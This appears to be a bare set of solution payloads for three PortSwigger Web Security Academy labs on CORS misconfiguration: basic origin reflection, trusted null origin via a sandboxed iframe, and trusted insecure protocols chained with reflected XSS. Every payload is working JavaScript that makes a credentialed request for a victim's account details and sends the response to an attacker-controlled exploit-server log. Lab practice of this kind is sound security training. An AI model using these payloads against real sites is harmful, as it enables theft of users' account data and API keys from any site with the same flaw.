
- ==CORS vulnerability with trusted insecure protocols== 
<script>
    document.location="http://stock.lab_id.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://lab_id.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://exploit_id.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
</script>

- ==CORS vulnerability with basic origin reflection== 

<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://lab_id.web-security-academy.net/accountDetails',true);
req.withCredentials = true;
req.send();

function reqListener() {
        location='https://exploit_id.exploit-server.net/log?key='+this.responseText;
};
</script>

- ==CORS vulnerability with trusted null origin== 
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://lab_id.web-security-academy.net/accountDetails',true);
req.withCredentials = true;
req.send();

function reqListener() {
location='https://exploit_id.exploit-server.net/log?key='+this.responseText;
};
</script>"></iframe>
